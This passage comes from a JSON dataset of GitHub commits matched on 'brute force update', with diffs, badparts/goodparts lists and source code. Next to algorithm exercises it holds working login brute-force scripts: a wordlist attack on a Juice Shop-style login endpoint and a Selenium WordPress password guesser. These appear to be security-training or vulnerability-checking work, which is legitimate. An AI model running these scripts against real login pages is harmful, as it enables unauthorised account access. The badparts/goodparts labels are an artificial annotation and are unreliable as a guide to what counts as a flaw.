self[v]\n                if alt < dist[v]:\n                    dist[v] = alt\n                    prev[v] = u\n                    Q.put((alt, v))\n\n        S = []\n        u = target\n        while u is not None:\n            S.insert(0, u)\n            u = prev[u]\n\n        return S\n\ndef parse(data: str):\n    values = []\n\n    for line in data.splitlines():\n        values.append([INDICES.index(k) for k in line])\n\n    return Grid.init_with_data(values)\n\n\ndef part1(grid: Grid):\n    start = grid.find(START)\n    end = grid.find(END)\n    \n    path = grid.dijkstra(start, end)\n    return len(path) - 1\n\ndef part2(grid: Grid):\n    start = grid.find(START)\n    end = grid.find(END)\n\n    grid[start] = INDICES.index('a')\n\n    best = INFINITY\n    \n    for xy in grid.findall(INDICES.index('a')):\n        path = grid.dijkstra(xy, end)\n\n        attempt = len(path) - 1\n        if attempt <= 0:\n            continue\n\n        if attempt < best and attempt != 0:\n            best = attempt\n\n    return best\n"}},"msg":"Day 12 update\n\n- Search backward for value instead of brute forcing dijkstra forward"}},"https:\/\/github.com\/JeHa00\/TIL":{"f131212c6a222a9f4e81b97436383dda105d39f8":{"url":"https:\/\/api.github.com\/repos\/JeHa00\/TIL\/commits\/f131212c6a222a9f4e81b97436383dda105d39f8","html_url":"https:\/\/github.com\/JeHa00\/TIL\/commit\/f131212c6a222a9f4e81b97436383dda105d39f8","message":"update brute force algorithum","sha":"f131212c6a222a9f4e81b97436383dda105d39f8","keyword":"brute force update","diff":"diff --git a\/DataStructure_Algorithm\/7-1-Brute-force-method.py b\/DataStructure_Algorithm\/7-1-Brute-force-method.py\nindex fe9c98a..70bfedb 100644\n--- a\/DataStructure_Algorithm\/7-1-Brute-force-method.py\n+++ b\/DataStructure_Algorithm\/7-1-Brute-force-method.py\n@@ -3,19 +3,25 @@ def bf_match(txt: str, pat: str) -> int:\n     \ube0c\ub8e8\ud2b8 \ud3ec\uc2a4\ubc95\uc73c\ub85c \ubb38\uc790\uc5f4 \uac80\uc0c9\r\n     \"\"\"\r\n \r\n-    pt = 0\r\n+    pt = 0  # text\uc758 index\r\n \r\n-    pp = 0\r\n+    pp = 0  # pattern\uc758 index\r\n \r\n-    while pt != len(txt) and pp != len(pat): \r\n-        if txt[pt] == pat[pp]: # ABCCDEFG \/ # CDE\r\n-            pt += 1 # 4\r\n-            pp += 1 # 2\r\n+    while pt != len(txt) and pp != len(pat):  # \ubcd1\ub82c \uc870\uac74 \ub9cc\uc871 \uc2dc \uacc4\uc18d \ubc18\ubcf5\r\n+        if txt[pt] == pat[pp]:  # \uc6d0\uc18c \uac12\uc774 \ub3d9\uc77c\ud558\uba74 \uc99d\uac00\ud55c\ub2e4.\r\n+            pt += 1  # 4\r\n+            pp += 1  # 2\r\n         else:\r\n-            pt = pt - pp + 1 # 5\ub85c \uc124\uc815\r\n-            pp = 0 # 0\uc73c\ub85c \uc124\uc815 \r\n+            pt = pt - pp + 1  # 5\ub85c \uc124\uc815\r\n \r\n+            \"\"\"\r\n+            \uc5ec\uae30\uc11c pp\ub97c \ube7c\ub294 \uc774\uc720\ub294 \ub2e4\uc74c\uacfc \uac19\ub2e4. \r\n+            pp\ub294 \ud45c\uba74\uc801\uc73c\ub85c\ub294 pattern\uc758 index \uc5ed\ud560\uc774\uc9c0\ub9cc, \ub2f4\uaca8\uc788\ub294 \ub610 \ub2e4\ub978 \uc758\ubbf8\ub294\r\n+            text\uc640 pattern\uc744 \ube44\uad50\ud560 \ub54c, text\uc758 index \uac12\uc774 \ucee4\uc9c4 \uac12\uc744 \uc758\ubbf8\ud55c\ub2e4. \r\n+            \uadf8\ub798\uc11c \ub2e4\uc2dc pp = 0 \uacfc \ube44\uad50\ud558\uae30 \uc704\ud574\uc11c\ub294 pp\ub97c \ube7c\uc57c \ud55c\ub2e4. \r\n+            \"\"\"\r\n \r\n+            pp = 0  # 0\uc73c\ub85c \uc124\uc815\r\n \r\n \r\n if __name__ == \"__main__\":\r\n@@ -25,7 +31,7 @@ def bf_match(txt: str, pat: str) -> int:\n     idx = bf_match(s1, s2)\r\n \r\n     if idx == -1:\r\n-        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc744 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r\n+        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc774 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r\n \r\n     else:\r\n         print(f\"text\uc758 {(idx + 1)}\ubc88\uc9f8 \ubb38\uc790\ubd80\ud130 \uc77c\uce58\ud55c\ub2e4.\")\r\ndiff --git \"a\/DataStructure_Algorithm\/7_\\353\\254\\270\\354\\236\\220\\354\\227\\264\\352\\262\\200\\354\\203\\211.md\" \"b\/DataStructure_Algorithm\/7_\\353\\254\\270\\354\\236\\220\\354\\227\\264\\352\\262\\200\\354\\203\\211.md\"\nindex 1f9a1a9..0d36df5 100644\n--- \"a\/DataStructure_Algorithm\/7_\\353\\254\\270\\354\\236\\220\\354\\227\\264\\352\\262\\200\\354\\203\\211.md\"\n+++ \"b\/DataStructure_Algorithm\/7_\\353\\254\\270\\354\\236\\220\\354\\227\\264\\352\\262\\200\\354\\203\\211.md\"\n@@ -21,9 +21,16 @@\n \r\n ---\r\n \r\n-#\r\n+# KMP\ubc95\r\n \r\n \r\n+<br>\r\n+\r\n+---\r\n+# \ubcf4\uc774\uc5b4 \ubb34\uc5b4\ubc95\r\n+\r\n+<br>\r\n+\r\n ---\r\n \r\n # Reference \r\n","files":{"\/DataStructure_Algorithm\/7-1-Brute-force-method.py":{"changes":[{"diff":"\n     \ube0c\ub8e8\ud2b8 \ud3ec\uc2a4\ubc95\uc73c\ub85c \ubb38\uc790\uc5f4 \uac80\uc0c9\r\n     \"\"\"\r\n \r\n-    pt = 0\r\n+    pt = 0  # text\uc758 index\r\n \r\n-    pp = 0\r\n+    pp = 0  # pattern\uc758 index\r\n \r\n-    while pt != len(txt) and pp != len(pat): \r\n-        if txt[pt] == pat[pp]: # ABCCDEFG \/ # CDE\r\n-            pt += 1 # 4\r\n-            pp += 1 # 2\r\n+    while pt != len(txt) and pp != len(pat):  # \ubcd1\ub82c \uc870\uac74 \ub9cc\uc871 \uc2dc \uacc4\uc18d \ubc18\ubcf5\r\n+        if txt[pt] == pat[pp]:  # \uc6d0\uc18c \uac12\uc774 \ub3d9\uc77c\ud558\uba74 \uc99d\uac00\ud55c\ub2e4.\r\n+            pt += 1  # 4\r\n+            pp += 1  # 2\r\n         else:\r\n-            pt = pt - pp + 1 # 5\ub85c \uc124\uc815\r\n-            pp = 0 # 0\uc73c\ub85c \uc124\uc815 \r\n+            pt = pt - pp + 1  # 5\ub85c \uc124\uc815\r\n \r\n+            \"\"\"\r\n+            \uc5ec\uae30\uc11c pp\ub97c \ube7c\ub294 \uc774\uc720\ub294 \ub2e4\uc74c\uacfc \uac19\ub2e4. \r\n+            pp\ub294 \ud45c\uba74\uc801\uc73c\ub85c\ub294 pattern\uc758 index \uc5ed\ud560\uc774\uc9c0\ub9cc, \ub2f4\uaca8\uc788\ub294 \ub610 \ub2e4\ub978 \uc758\ubbf8\ub294\r\n+            text\uc640 pattern\uc744 \ube44\uad50\ud560 \ub54c, text\uc758 index \uac12\uc774 \ucee4\uc9c4 \uac12\uc744 \uc758\ubbf8\ud55c\ub2e4. \r\n+            \uadf8\ub798\uc11c \ub2e4\uc2dc pp = 0 \uacfc \ube44\uad50\ud558\uae30 \uc704\ud574\uc11c\ub294 pp\ub97c \ube7c\uc57c \ud55c\ub2e4. \r\n+            \"\"\"\r\n \r\n+            pp = 0  # 0\uc73c\ub85c \uc124\uc815\r\n \r\n \r\n if __name__ == \"__main__\":\r\n","add":14,"remove":8,"filename":"\/DataStructure_Algorithm\/7-1-Brute-force-method.py","badparts":["    pt = 0\r","    pp = 0\r","    while pt != len(txt) and pp != len(pat): \r","        if txt[pt] == pat[pp]: # ABCCDEFG \/ # CDE\r","            pt += 1 # 4\r","            pp += 1 # 2\r","            pt = pt - pp + 1 # 5\ub85c \uc124\uc815\r","            pp = 0 # 0\uc73c\ub85c \uc124\uc815 \r"],"goodparts":["    pt = 0  # text\uc758 index\r","    pp = 0  # pattern\uc758 index\r","    while pt != len(txt) and pp != len(pat):  # \ubcd1\ub82c \uc870\uac74 \ub9cc\uc871 \uc2dc \uacc4\uc18d \ubc18\ubcf5\r","        if txt[pt] == pat[pp]:  # \uc6d0\uc18c \uac12\uc774 \ub3d9\uc77c\ud558\uba74 \uc99d\uac00\ud55c\ub2e4.\r","            pt += 1  # 4\r","            pp += 1  # 2\r","            pt = pt - pp + 1  # 5\ub85c \uc124\uc815\r","            \"\"\"\r","            \uc5ec\uae30\uc11c pp\ub97c \ube7c\ub294 \uc774\uc720\ub294 \ub2e4\uc74c\uacfc \uac19\ub2e4. \r","            pp\ub294 \ud45c\uba74\uc801\uc73c\ub85c\ub294 pattern\uc758 index \uc5ed\ud560\uc774\uc9c0\ub9cc, \ub2f4\uaca8\uc788\ub294 \ub610 \ub2e4\ub978 \uc758\ubbf8\ub294\r","            text\uc640 pattern\uc744 \ube44\uad50\ud560 \ub54c, text\uc758 index \uac12\uc774 \ucee4\uc9c4 \uac12\uc744 \uc758\ubbf8\ud55c\ub2e4. \r","            \uadf8\ub798\uc11c \ub2e4\uc2dc pp = 0 \uacfc \ube44\uad50\ud558\uae30 \uc704\ud574\uc11c\ub294 pp\ub97c \ube7c\uc57c \ud55c\ub2e4. \r","            \"\"\"\r","            pp = 0  # 0\uc73c\ub85c \uc124\uc815\r"]},{"diff":"\n     idx = bf_match(s1, s2)\r\n \r\n     if idx == -1:\r\n-        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc744 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r\n+        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc774 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r\n \r\n     else:\r\n         print(f\"text\uc758 {(idx + 1)}\ubc88\uc9f8 \ubb38\uc790\ubd80\ud130 \uc77c\uce58\ud55c\ub2e4.\")\r","add":1,"remove":1,"filename":"\/DataStructure_Algorithm\/7-1-Brute-force-method.py","badparts":["        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc744 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r"],"goodparts":["        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc774 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r"]}],"source":"\ndef bf_match(txt: str, pat: str) -> int:\r \"\"\"\r \ube0c\ub8e8\ud2b8 \ud3ec\uc2a4\ubc95\uc73c\ub85c \ubb38\uc790\uc5f4 \uac80\uc0c9\r \"\"\"\r \r pt=0\r \r pp=0\r \r while pt !=len(txt) and pp !=len(pat): \r if txt[pt]==pat[pp]: pt +=1 pp +=1 else:\r pt=pt -pp +1 pp=0 \r \r \r \r if __name__==\"__main__\":\r s1=input(\"text\ub97c \uc785\ub825\ud558\ub77c.: \")\r s2=input(\"pattern\uc744 \uc785\ub825\ud558\ub77c.: \")\r \r idx=bf_match(s1, s2)\r \r if idx==-1:\r print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc744 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r \r else:\r print(f\"text\uc758{(idx +1)}\ubc88\uc9f8 \ubb38\uc790\ubd80\ud130 \uc77c\uce58\ud55c\ub2e4.\")\r ","sourceWithComments":"def bf_match(txt: str, pat: str) -> int:\r\n    \"\"\"\r\n    \ube0c\ub8e8\ud2b8 \ud3ec\uc2a4\ubc95\uc73c\ub85c \ubb38\uc790\uc5f4 \uac80\uc0c9\r\n    \"\"\"\r\n\r\n    pt = 0\r\n\r\n    pp = 0\r\n\r\n    while pt != len(txt) and pp != len(pat): \r\n        if txt[pt] == pat[pp]: # ABCCDEFG \/ # CDE\r\n            pt += 1 # 4\r\n            pp += 1 # 2\r\n        else:\r\n            pt = pt - pp + 1 # 5\ub85c \uc124\uc815\r\n            pp = 0 # 0\uc73c\ub85c \uc124\uc815 \r\n\r\n\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    s1 = input(\"text\ub97c \uc785\ub825\ud558\ub77c.: \")\r\n    s2 = input(\"pattern\uc744 \uc785\ub825\ud558\ub77c.: \")\r\n\r\n    idx = bf_match(s1, s2)\r\n\r\n    if idx == -1:\r\n        print(\"\ud14d\uc2a4\ud2b8 \uc548\uc5d0 \ud328\ud134\uc744 \uc874\uc7ac\ud558\uc9c0 \uc54a\ub294\ub2e4.\")\r\n\r\n    else:\r\n        print(f\"text\uc758 {(idx + 1)}\ubc88\uc9f8 \ubb38\uc790\ubd80\ud130 \uc77c\uce58\ud55c\ub2e4.\")\r\n"}},"msg":"update brute force algorithum"}},"https:\/\/github.com\/SergioFelzener\/python":{"6a9bb51faf99a296f9cecd4d5044cd68626dd561":{"url":"https:\/\/api.github.com\/repos\/SergioFelzener\/python\/commits\/6a9bb51faf99a296f9cecd4d5044cd68626dd561","html_url":"https:\/\/github.com\/SergioFelzener\/python\/commit\/6a9bb51faf99a296f9cecd4d5044cd68626dd561","message":"Update brute force login with colors results","sha":"6a9bb51faf99a296f9cecd4d5044cd68626dd561","keyword":"brute force update","diff":"diff --git a\/owaspJuice\/brute.py b\/owaspJuice\/brute.py\nindex b20b907..662f445 100644\n--- a\/owaspJuice\/brute.py\n+++ b\/owaspJuice\/brute.py\n@@ -1,6 +1,9 @@\n from urllib import response\n import requests\n-from termcolor import colored\n+# from termcolor import colored\n+from colorama import Fore\n+from colorama import Style\n+\n \n user = \"admin@juice-sh.op\"\n \n@@ -13,8 +16,9 @@\n     data ={\"email\" : user, \"password\": password}\n     response = requests.post(\"http:\/\/shop.bancocn.com\/rest\/user\/login\", json=data)\n     code = response.status_code\n-    print(colored('E-MAIL(login):{} - {} - Status Code : {}'.format(user, password, code), 'blue'))\n+    print(f'E-MAIL(login):{Fore.YELLOW}{user}{Style.RESET_ALL} - {Fore.BLUE}{password}{Style.RESET_ALL} - Status Code : {Fore.RED}{code}{Style.RESET_ALL}'.format(user, password, code))\n+    # print(f\"This is {Fore.GREEN}{user}{Style.RESET_ALL}!\".format(user))\n     \n     if code != 401:\n-        print (colored(\"[+] PASSWORD FOUND - {}\".format(password), \"green\"))\n+        print (f\"\\n[+] PASSWORD FOUND FOR {Fore.CYAN}{user}{Style.RESET_ALL} : {Fore.GREEN}{password}{Style.RESET_ALL}\\n\\n\".format(user, password))\n         break\n","files":{"\/owaspJuice\/brute.py":{"changes":[{"diff":"\n from urllib import response\n import requests\n-from termcolor import colored\n+# from termcolor import colored\n+from colorama import Fore\n+from colorama import Style\n+\n \n user = \"admin@juice-sh.op\"\n \n","add":4,"remove":1,"filename":"\/owaspJuice\/brute.py","badparts":["from termcolor import colored"],"goodparts":["from colorama import Fore","from colorama import Style"]},{"diff":"     data ={\"email\" : user, \"password\": password}\n     response = requests.post(\"http:\/\/shop.bancocn.com\/rest\/user\/login\", json=data)\n     code = response.status_code\n-    print(colored('E-MAIL(login):{} - {} - Status Code : {}'.format(user, password, code), 'blue'))\n+    print(f'E-MAIL(login):{Fore.YELLOW}{user}{Style.RESET_ALL} - {Fore.BLUE}{password}{Style.RESET_ALL} - Status Code : {Fore.RED}{code}{Style.RESET_ALL}'.format(user, password, code))\n+    # print(f\"This is {Fore.GREEN}{user}{Style.RESET_ALL}!\".format(user))\n     \n     if code != 401:\n-        print (colored(\"[+] PASSWORD FOUND - {}\".format(password), \"green\"))\n+        print (f\"\\n[+] PASSWORD FOUND FOR {Fore.CYAN}{user}{Style.RESET_ALL} : {Fore.GREEN}{password}{Style.RESET_ALL}\\n\\n\".format(user, password))\n         break\n","add":3,"remove":2,"filename":"\/owaspJuice\/brute.py","badparts":["    print(colored('E-MAIL(login):{} - {} - Status Code : {}'.format(user, password, code), 'blue'))","        print (colored(\"[+] PASSWORD FOUND - {}\".format(password), \"green\"))"],"goodparts":["    print(f'E-MAIL(login):{Fore.YELLOW}{user}{Style.RESET_ALL} - {Fore.BLUE}{password}{Style.RESET_ALL} - Status Code : {Fore.RED}{code}{Style.RESET_ALL}'.format(user, password, code))","        print (f\"\\n[+] PASSWORD FOUND FOR {Fore.CYAN}{user}{Style.RESET_ALL} : {Fore.GREEN}{password}{Style.RESET_ALL}\\n\\n\".format(user, password))"]}],"source":"\nfrom urllib import response import requests from termcolor import colored user=\"admin@juice-sh.op\" with open(\"wordlist.txt\", \"r\") as file: passwords=file.readlines() for password in passwords: password=password.strip() data={\"email\": user, \"password\": password} response=requests.post(\"http:\/\/shop.bancocn.com\/rest\/user\/login\", json=data) code=response.status_code print(colored('E-MAIL(login):{} -{} -Status Code:{}'.format(user, password, code), 'blue')) if code !=401: print(colored(\"[+] PASSWORD FOUND -{}\".format(password), \"green\")) break ","sourceWithComments":"from urllib import response\nimport requests\nfrom termcolor import colored\n\nuser = \"admin@juice-sh.op\"\n\nwith open(\"wordlist.txt\", \"r\") as file:\n    passwords = file.readlines()\n    \n\nfor password in passwords:\n    password = password.strip()\n    data ={\"email\" : user, \"password\": password}\n    response = requests.post(\"http:\/\/shop.bancocn.com\/rest\/user\/login\", json=data)\n    code = response.status_code\n    print(colored('E-MAIL(login):{} - {} - Status Code : {}'.format(user, password, code), 'blue'))\n    \n    if code != 401:\n        print (colored(\"[+] PASSWORD FOUND - {}\".format(password), \"green\"))\n        break\n"}},"msg":"Update brute force login with colors results"}},"https:\/\/github.com\/yijeongree\/OWASP-Top-10-2021":{"1fea7b93519ba1f61b2cace6ddfdaa50d9bb0c9b":{"url":"https:\/\/api.github.com\/repos\/yijeongree\/OWASP-Top-10-2021\/commits\/1fea7b93519ba1f61b2cace6ddfdaa50d9bb0c9b","html_url":"https:\/\/github.com\/yijeongree\/OWASP-Top-10-2021\/commit\/1fea7b93519ba1f61b2cace6ddfdaa50d9bb0c9b","message":"Update 07_brute_force.py","sha":"1fea7b93519ba1f61b2cace6ddfdaa50d9bb0c9b","keyword":"brute force update","diff":"diff --git a\/07_brute_force.py b\/07_brute_force.py\nindex be1c410..f70bce9 100644\n--- a\/07_brute_force.py\n+++ b\/07_brute_force.py\n@@ -16,6 +16,7 @@\n id = input('ID : ')\r\n \r\n url = 'http:\/\/' + text\r\n+error = 0\r\n \r\n for passwd_length in range(1,3): #\uc790\ub9bf\uc218 \uc9c0\uc815 (1~2)\r\n     admin_passwd = product(words, repeat=passwd_length) #words \uc548\uc758 \ubb38\uc790\ub97c \ud558\ub098\uc529 \ub04a\uc5b4\uc11c \uacbd\uc6b0\uc758 \uc218 \ub9cc\ub4e4\uae30\r\n@@ -49,4 +50,4 @@\n                 continue\r\n \r\n if error != 1:\r\n-    print('Brute Force : \uc591\ud638')\n\\ No newline at end of file\n+    print('Brute Force : \uc591\ud638')\r\n","files":{"\/07_brute_force.py":{"changes":[{"diff":"                 continue\r\n \r\n if error != 1:\r\n-    print('Brute Force : \uc591\ud638')\n\\ No newline at end of file\n+    print('Brute Force : \uc591\ud638')\r\n","add":1,"remove":1,"filename":"\/07_brute_force.py","badparts":["    print('Brute Force : \uc591\ud638')"],"goodparts":["    print('Brute Force : \uc591\ud638')\r"]}],"source":"\nfrom itertools import product\r from selenium import webdriver\r from urllib.error import *\r from urllib.request import *\r import sys\r \r words='wxyz'\r \r xpath_id='\/\/[@id=\"user_login\"]'\r xpath_pw='\/\/[@id=\"user_pass\"]'\r xpath_click='\/\/*[@id=\"wp-submit\"]'\r \r text=input('\ub85c\uadf8\uc778 \uc8fc\uc18c\ub97c \uc785\ub825\ud558\uc138\uc694(www.test.com): ')\r id=input('ID: ')\r \r url='http:\/\/' +text\r \r for passwd_length in range(1,3): admin_passwd=product(words, repeat=passwd_length) \r for passwd_tmp in admin_passwd:\r passwd=''\r passwd=''.join(passwd_tmp)\r \r driver=webdriver.Chrome(\"C:\/chromedriver.exe\")\r driver.get(url)\r \r driver.find_element('xpath',xpath_id).send_keys(id)\r driver.find_element('xpath',xpath_pw).send_keys(passwd)\r driver.find_element('xpath',xpath_click).click()\r \r try:\r res=urlopen(driver.current_url)\r html=driver.page_source\r \r except HTTPError as e: continue\r else: if \"\uc548\ub155\ud558\uc138\uc694\" in html:\r print('Brute Force: \ucde8\uc57d')\r error=1\r sys.exit()\r else:\r continue\r \r if error !=1:\r print('Brute Force: \uc591\ud638') ","sourceWithComments":"from itertools import product\r\nfrom selenium import webdriver\r\nfrom urllib.error import *\r\nfrom urllib.request import *\r\nimport sys\r\n\r\n#brutefore \uacf5\uaca9\uc5d0 \uc0ac\uc6a9\ud560 \ubb38\uc790\r\nwords ='wxyz'\r\n\r\n#xpath \ubaa8\uc74c\r\nxpath_id = '\/\/[@id=\"user_login\"]'\r\nxpath_pw = '\/\/[@id=\"user_pass\"]'\r\nxpath_click = '\/\/*[@id=\"wp-submit\"]'\r\n\r\ntext = input('\ub85c\uadf8\uc778 \uc8fc\uc18c\ub97c \uc785\ub825\ud558\uc138\uc694(www.test.com) : ')\r\nid = input('ID : ')\r\n\r\nurl = 'http:\/\/' + text\r\n\r\nfor passwd_length in range(1,3): #\uc790\ub9bf\uc218 \uc9c0\uc815 (1~2)\r\n    admin_passwd = product(words, repeat=passwd_length) #words \uc548\uc758 \ubb38\uc790\ub97c \ud558\ub098\uc529 \ub04a\uc5b4\uc11c \uacbd\uc6b0\uc758 \uc218 \ub9cc\ub4e4\uae30\r\n    \r\n    #bruteforce \uacf5\uaca9 \uc2e4\ud589\r\n    for passwd_tmp in admin_passwd:\r\n        passwd = ''\r\n        passwd = ''.join(passwd_tmp)\r\n\r\n        #\ud06c\ub86c \ube0c\ub77c\uc6b0\uc800 \uc2e4\ud589 -> url \uc5f4\uae30\r\n        driver = webdriver.Chrome(\"C:\/chromedriver.exe\")\r\n        driver.get(url)\r\n\r\n        #\uc9c0\uc815\ud55c xpath\uc5d0 \uac12 \ub123\uace0 \uc2e4\ud589\ud558\uae30\r\n        driver.find_element('xpath',xpath_id).send_keys(id)\r\n        driver.find_element('xpath',xpath_pw).send_keys(passwd)\r\n        driver.find_element('xpath',xpath_click).click()\r\n\r\n        try:\r\n            res = urlopen(driver.current_url)\r\n            html = driver.page_source\r\n\r\n        except HTTPError as e: # HTTP \uc5d0\ub7ec\ubc1c\uc0dd -> \ubb34\uc2dc\ud558\uace0 \uc9c4\ud589\r\n            continue\r\n        else: #\ub85c\uadf8\uc778 \uc131\uacf5\uc2dc \ub728\ub294 \ud398\uc774\uc9c0 \ud2b9\uc9d5\uc73c\ub85c brueteforce \uacf5\uaca9 \uc131\uacf5 \uc5ec\ubd80 \ud655\uc778\r\n            if \"\uc548\ub155\ud558\uc138\uc694\" in html:\r\n                print('Brute Force : \ucde8\uc57d')\r\n                error = 1\r\n                sys.exit()\r\n            else:\r\n                continue\r\n\r\nif error != 1:\r\n    print('Brute Force : \uc591\ud638')"}},"msg":"Update 07_brute_force.py"}},"https:\/\/github.com\/CyberCosmos24\/Drexel-CCI-Project":{"686d6b550dab72f2fa3af1a314d46ac671605031":{"url":"https:\/\/api.github.com\/repos\/CyberCosmos24\/Drexel-CCI-Project\/commits\/686d6b550dab72f2fa3af1a314d46ac671605031","html_url":"https:\/\/github.com\/CyberCosmos24\/Drexel-CCI-Project\/commit\/686d6b550dab72f2fa3af1a314d46ac671605031","sha":"686d6b550dab72f2fa3af1a314d46ac671605031","keyword":"brute force update","diff":"diff --git a\/PasswordCracker\/brute-force.py b\/PasswordCracker\/brute-force.py\nindex bd007d0..947032b 100644\n--- a\/PasswordCracker\/brute-force.py\n+++ b\/PasswordCracker\/brute-force.py\n@@ -1,20 +1,14 @@\n import itertools\n import string\n-import sys\n \n-def guess(password):\n-\tchars = string.ascii_lowercase + string.digits\n+def guess(passLength):\n+\tchars = string.ascii_letters + string.digits + string.punctuation\n \tattempts = 0\n-\tfor password_length in range(1,9):\n+\tfor password_length in range(1,int(passLength)+1):\n \t\tfor guess in itertools.product(chars, repeat=password_length):\n \t\t\tattempts += 1\n \t\t\tguess = ''.join(guess)\n-\t\t\tif guess == password:\n-\t\t\t\treturn 'Password is {} found in {} guesses.'.format(guess, attempts)\n-\t\t\telse:\n-\t\t\t\tprint('{} guesses'.format(attempts))\n-n = len(sys.argv)\n-if n > 1:\n-\tprint(guess(sys.argv[1]))\n-else:\n-\tprint('Enter the password to crack as an argument.')\n+\t\t\tprint(guess)\n+length = input(\"Max Password Length: \")\n+print(\"Sending all passwords up to {} characters\".format(length)) \n+print(guess(length))\n","message":"","files":{"\/PasswordCracker\/brute-force.py":{"changes":[{"diff":"\n import itertools\n import string\n-import sys\n \n-def guess(password):\n-\tchars = string.ascii_lowercase + string.digits\n+def guess(passLength):\n+\tchars = string.ascii_letters + string.digits + string.punctuation\n \tattempts = 0\n-\tfor password_length in range(1,9):\n+\tfor password_length in range(1,int(passLength)+1):\n \t\tfor guess in itertools.product(chars, repeat=password_length):\n \t\t\tattempts += 1\n \t\t\tguess = ''.join(guess)\n-\t\t\tif guess == password:\n-\t\t\t\treturn 'Password is {} found in {} guesses.'.format(guess, attempts)\n-\t\t\telse:\n-\t\t\t\tprint('{} guesses'.format(attempts))\n-n = len(sys.argv)\n-if n > 1:\n-\tprint(guess(sys.argv[1]))\n-else:\n-\tprint('Enter the password to crack as an argument.')\n+\t\t\tprint(guess)\n+length = input(\"Max Password Length: \")\n+print(\"Sending all passwords up to {} characters\".format(length)) \n+print(guess(length))\n","add":7,"remove":13,"filename":"\/PasswordCracker\/brute-force.py","badparts":["import sys","def guess(password):","\tchars = string.ascii_lowercase + string.digits","\tfor password_length in range(1,9):","\t\t\tif guess == password:","\t\t\t\treturn 'Password is {} found in {} guesses.'.format(guess, attempts)","\t\t\telse:","\t\t\t\tprint('{} guesses'.format(attempts))","n = len(sys.argv)","if n > 1:","\tprint(guess(sys.argv[1]))","else:","\tprint('Enter the password to crack as an argument.')"],"goodparts":["def guess(passLength):","\tchars = string.ascii_letters + string.digits + string.punctuation","\tfor password_length in range(1,int(passLength)+1):","\t\t\tprint(guess)","length = input(\"Max Password Length: \")","print(\"Sending all passwords up to {} characters\".format(length)) ","print(guess(length))"]}],"source":"\nimport itertools import string import sys def guess(password): \tchars=string.ascii_lowercase +string.digits \tattempts=0 \tfor password_length in range(1,9): \t\tfor guess in itertools.product(chars, repeat=password_length): \t\t\tattempts +=1 \t\t\tguess=''.join(guess) \t\t\tif guess==password: \t\t\t\treturn 'Password is{} found in{} guesses.'.format(guess, attempts) \t\t\telse: \t\t\t\tprint('{} guesses'.format(attempts)) n=len(sys.argv) if n > 1: \tprint(guess(sys.argv[1])) else: \tprint('Enter the password to crack as an argument.') ","sourceWithComments":"import itertools\nimport string\nimport sys\n\ndef guess(password):\n\tchars = string.ascii_lowercase + string.digits\n\tattempts = 0\n\tfor password_length in range(1,9):\n\t\tfor guess in itertools.product(chars, repeat=password_length):\n\t\t\tattempts += 1\n\t\t\tguess = ''.join(guess)\n\t\t\tif guess == password:\n\t\t\t\treturn 'Password is {} found in {} guesses.'.format(guess, attempts)\n\t\t\telse:\n\t\t\t\tprint('{} guesses'.format(attempts))\nn = len(sys.argv)\nif n > 1:\n\tprint(guess(sys.argv[1]))\nelse:\n\tprint('Enter the password to crack as an argument.')\n"}},"msg":"Update brute-force.py"},"04b610f33adc0216681efeb579642d6b02e0ec88":{"url":"https:\/\/api.github.com\/repos\/CyberCosmos24\/Drexel-CCI-Project\/commits\/04b610f33adc0216681efeb579642d6b02e0ec88","html_url":"https:\/\/github.com\/CyberCosmos24\/Drexel-CCI-Project\/commit\/04b610f33adc0216681efeb579642d6b02e0ec88","sha":"04b610f33adc0216681efeb579642d6b02e0ec88","keyword":"brute force update","diff":"diff --git a\/PasswordCracker\/brute-force.py b\/PasswordCracker\/brute-force.py\nindex 947032b..5c296c6 100644\n--- a\/PasswordCracker\/brute-force.py\n+++ b\/PasswordCracker\/brute-force.py\n@@ -11,4 +11,4 @@ def guess(passLength):\n \t\t\tprint(guess)\n length = input(\"Max Password Length: \")\n print(\"Sending all passwords up to {} characters\".format(length)) \n-print(guess(length))\n+guess(length)\n","message":"","files":{"\/PasswordCracker\/brute-force.py":{"changes":[{"diff":"\n \t\t\tprint(guess)\n length = input(\"Max Password Length: \")\n print(\"Sending all passwords up to {} characters\".format(length)) \n-print(guess(length))\n+guess(length)\n","add":1,"remove":1,"filename":"\/PasswordCracker\/brute-force.py","badparts":["print(guess(length))"],"goodparts":["guess(length)"]}],"source":"\nimport itertools import string def guess(passLength): \tchars=string.ascii_letters +string.digits +string.punctuation \tattempts=0 \tfor password_length in range(1,int(passLength)+1): \t\tfor guess in itertools.product(chars, repeat=password_length): \t\t\tattempts +=1 \t\t\tguess=''.join(guess) \t\t\tprint(guess) length=input(\"Max Password Length: \") print(\"Sending all passwords up to{} characters\".format(length)) print(guess(length)) ","sourceWithComments":"import itertools\nimport string\n\ndef guess(passLength):\n\tchars = string.ascii_letters + string.digits + string.punctuation\n\tattempts = 0\n\tfor password_length in range(1,int(passLength)+1):\n\t\tfor guess in itertools.product(chars, repeat=password_length):\n\t\t\tattempts += 1\n\t\t\tguess = ''.join(guess)\n\t\t\tprint(guess)\nlength = input(\"Max Password Length: \")\nprint(\"Sending all passwords up to {} characters\".format(length)) \nprint(guess(length))\n"}},"msg":"Update 